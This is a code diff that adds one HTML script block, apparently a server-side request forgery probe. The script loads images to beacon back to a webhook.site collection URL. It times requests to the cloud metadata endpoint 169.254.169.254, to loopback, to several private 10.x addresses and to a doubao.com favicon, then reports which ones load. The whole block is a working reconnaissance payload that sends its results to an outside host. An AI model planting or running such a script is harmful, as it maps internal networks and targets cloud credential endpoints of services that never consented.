@@ -1,0 +1,15 @@
+<script>
+var W='https://webhook.site/7dd91dcc-ce1e-432e-b6eb-30f64a9e1f66/';
+function beacon(s){var x=new Image();x.src=W+'?r='+encodeURIComponent(s)+'&_='+Math.random();}
+beacon('JS_RUN');
+function probe(u,l){var i=new Image();var t=Date.now();
+i.onload=function(){beacon(l+':ON_'+(Date.now()-t))};
+i.onerror=function(){beacon(l+':OFF_'+(Date.now()-t))};
+i.src=u+'?_='+Math.random();}
+probe('http://169.254.169.254/latest/meta-data/instance-id','META');
+probe('http://127.0.0.1/','LOOP');
+probe('http://10.8.8.8/','DNS10');
+probe('http://10.0.0.1/','10_0_0_1');
+probe('http://10.255.255.1/','UNROUT');
+probe('https://www.doubao.com/favicon.ico','DBFAV');
+</script>
